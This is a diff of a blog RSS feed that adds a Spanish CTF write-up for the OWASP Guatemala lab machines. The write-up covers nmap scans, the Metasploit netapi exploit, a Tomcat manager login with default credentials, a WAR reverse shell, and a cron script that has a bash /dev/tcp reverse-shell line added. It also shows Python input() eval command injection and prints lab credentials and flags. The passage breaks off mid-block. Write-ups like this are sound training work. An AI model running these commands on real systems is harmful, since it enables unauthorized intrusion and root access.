@@ -13,6 +13,8 @@
     <language>es</language>
     <copyright>©{year}, All Rights Reserved</copyright>
     <lastBuildDate>Sun, 19 May 2019 00:00:00 +0000</lastBuildDate>
+    <sy:updatePeriod>daily</sy:updatePeriod>
+    <sy:updateFrequency>daily</sy:updateFrequency>
     
         <atom:link href="https://sckull.github.io/categories/owasp/index.xml" rel="self" type="application/rss+xml" />
     
@@ -28,7 +30,357 @@
         <atom:modified>Sun, 19 May 2019 00:00:00 +0000</atom:modified>
         <guid>https://sckull.github.io/posts/owaspinfra/</guid>
         <description>OWASP CTF es una maquina del OWASP Guatemala, aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
-        
+        <content:encoded>&lt;p&gt;OWASP CTF es una maquina del OWASP Guatemala, aqui encontrarás la solucion para obtener la flag user.txt y root.txt de las diferentes maquinas presentadas por los organizadores.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/owasp/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;br&gt;
+&lt;hr /&gt;
+&lt;h2 id=&#34;infraestructura-1&#34;&gt;INFRAESTRUCTURA 1&lt;/h2&gt;
+&lt;h3 id=&#34;nmap&#34;&gt;NMAP&lt;/h3&gt;
+&lt;p&gt;Escaneo de puertos/version/sistema operativo con nmap&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-05-16 02:46 CDT
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 192.168.1.15
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00094s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+MAC Address: 00:0C:29:87:DA:AB &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VMware&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Device type: general purpose
+Running: Microsoft Windows XP
+OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3
+OS details: Microsoft Windows XP SP2 or SP3
+Network Distance: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hop
+Service Info: OSs: Windows, Windows XP&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 9.89 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;metasploit&#34;&gt;METASPLOIT&lt;/h3&gt;
+&lt;p&gt;Utilizamos el exploit netapi para windows xp contra el sistema operativo.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_014519.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;shell&#34;&gt;SHELL&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/netapi_ez.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Obtenemos permisos de administrador y nuestra flag en el Escritorio.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag.txt: flag{w1nd0ws_n3tap1_3xplo1t}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2 id=&#34;infraestructura-2&#34;&gt;INFRAESTRUCTURA 2&lt;/h2&gt;
+&lt;h3 id=&#34;nmap-1&#34;&gt;NMAP&lt;/h3&gt;
+&lt;p&gt;Escaneo de puertos tcp/version/sistema con nmap.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-05-16 03:54 CDT
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 192.168.1.14
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00088s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
+PORT     STATE SERVICE VERSION
+8009/tcp open  ajp13   Apache Jserv &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Protocol v1.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ajp-methods: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp open  http    Apache Tomcat 9.0.10
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-favicon: Apache Tomcat
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Apache Tomcat/9.0.10
+MAC Address: 00:0C:29:AB:85:8F &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VMware&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Device type: general purpose
+Running: Linux 3.X&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   0.88 ms 192.168.1.14
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 9.26 seconds.
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;puerto-8009&#34;&gt;Puerto 8009&lt;/h3&gt;
+&lt;p&gt;Nos muestra un error de conexion.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_005910.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;http&#34;&gt;HTTP&lt;/h3&gt;
+&lt;p&gt;En el puerto 8080 nos muestra una pagina corriendo en tomcat.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_005546.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos el panel de control para obtener acceso. Siempre probamos las contraseñas comunes o por default de alguna plataforma para ver si logramos obtener accesso, este es el caso de esta maquina.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;user: tomcat
+pass: s3cret
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Ahora tenemos acceso al panel de control de tomcat, podemos subir una shell/payload con extension war.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_010417.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Creamos nuestra reverse shell o payload con msfvenom y configuramos metasploit para poder obtener una sesion o shell por medio del payload.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_011331.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Subimos nuestro archivo en el panel de control en a parte de &amp;lsquo;WAR file to deploy&amp;rsquo;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_011534.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Para ejecutar nuestra shell solo buscamos en la lista que nos aparece por encima y basta con darle click para que se habra una sesion en metasploit.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_011725.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h4 id=&#34;metasploit-1&#34;&gt;Metasploit&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra_sesion.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Actualizamos nuestra shell con &lt;code&gt;python3&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_012235.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Estando dentro obtenemos nuestra bandera en la carpeta principal del usuario retoinfra1.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/Screenshot_20190521_012322.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;user.txt:flag{t0mcat_fa1_cr3dent1als}&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h3&gt;
+&lt;p&gt;Utilizndo pspy encontramos un cronjob que se ejecuta cada minuto y ejecuta un archivo sh en &lt;code&gt;/home/retoinfra1/script.sh&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra3_cron.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Ya que podemos editar el archivo y se ejecuta cada minuto vamos a modificar el script.sh para obtener una shell inversa, agregamos una linea de comando que nos permite obtener una shell inversa.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.10/7878 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; script.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Ponemos a la escucha nuestro puerto en netcat, esperamos y obtenemos nuestra shell inversa como usuario root.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra3_finalroot.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;root.txt:flag{cr0n_fa1l_bash_scr1pt}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2 id=&#34;infraestructura-3&#34;&gt;INFRAESTRUCTURA 3&lt;/h2&gt;
+&lt;h3 id=&#34;nmap-2&#34;&gt;NMAP&lt;/h3&gt;
+&lt;p&gt;Escaneo de puertos tcp con nmap.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-05-16 03:17 CDT
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 192.168.1.21
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.000077s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; closed ports
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 7.5p1 Ubuntu 10ubuntu0.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+5355/tcp  open  llmnr?
+10000/tcp open  tcpwrapped
+MAC Address: 00:0C:29:85:13:94 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VMware&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 142.49 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;puerto-10000&#34;&gt;PUERTO 10000&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra2_1.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;netcat---puerto-10000&#34;&gt;NETCAT - PUERTO 10000&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra2_netcat.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h5 id=&#34;ejecutando-comandos---netcat-10000&#34;&gt;EJECUTANDO comandos - NETCAT 10000&lt;/h5&gt;
+&lt;p&gt;&lt;a href=&#34;http://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html&#34;&gt;http://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html&lt;/a&gt;&lt;br /&gt;
+Al pasarle una cadena de texto al &amp;lsquo;input&amp;rsquo; este lo evalua, si le pasamos la siguiente  linea de codigo &lt;code&gt;&amp;quot;__import__(&#39;os&#39;).system(&#39;id&#39;)&amp;quot;&lt;/code&gt; lo va ejecutar.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra2_netcat_python.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Encontramos unas credenciales, para poder verlas utilizamos &lt;code&gt;&amp;quot;__import__(&#39;os&#39;).system(&#39;cat credentials.txt&#39;)&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;credentials.txt&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;user: retoinfra2
+password: 1337hackme!
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Nos logeamos por medio de SSH con las credenciales que encontramos.&lt;/p&gt;
+&lt;p&gt;Encontramos el archivo ping que nos mostraba en el navegador:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;num_packets&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; Please enther number of packets: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;PING localhost (127.0.0.1) 56(84) bytes of data&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num_packets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;64 bytes from localhost (127.0.0.1): icmp_seq={} ttl=64 time=0.0{} ms&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Tambien con nuestro archivo flag user y un hint:&lt;br /&gt;
+&lt;code&gt;user.txt: flag{598852e2cd167e254ce4c5e95393c372}&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cat hint.txt 
+Si estas leyendo esto felicidades, vas muy bien...
+Para la elevacion de privilegios en esta maquina tiene que realizar port forwarding...
+
+debug to rce werkzeug ....
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Revisamos los puertos con netstat -ntpl&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
